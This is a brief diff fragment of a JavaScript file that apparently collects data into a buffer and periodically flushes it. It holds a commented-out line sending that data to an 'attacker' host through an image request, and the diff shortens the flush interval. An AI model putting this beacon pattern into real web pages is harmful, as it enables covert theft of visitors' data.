@@ -27,7 +27,7 @@ window.setInterval(function() {
     // new Image().src = attacker + data;
     buffer = [];
   }
-}, 50);
+}, 20);
 
 window.setInterval(function() {
   var doc = thingy;
